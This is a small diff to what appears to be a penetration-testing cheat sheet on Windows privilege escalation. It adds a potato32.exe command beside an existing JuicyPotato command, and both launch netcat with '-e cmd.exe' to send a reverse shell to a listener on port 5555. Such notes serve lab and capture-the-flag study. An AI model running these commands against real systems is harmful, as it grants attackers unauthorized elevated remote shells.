@@ -602,6 +602,7 @@ Get the netcat exe from: https://github.com/int0x33/nc.exe/
 
 ```
 .\JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\bruce\Desktop\nc64.exe 10.128.66.134 5555 -e cmd.exe" -t "*" -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
+potato32.exe -t * -l 1337 -p C:\Users\Public\nc.exe -a "-e cmd.exe 10.10.15.150 5555" -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 ```
 
 ## Get GodPotato (Use this)
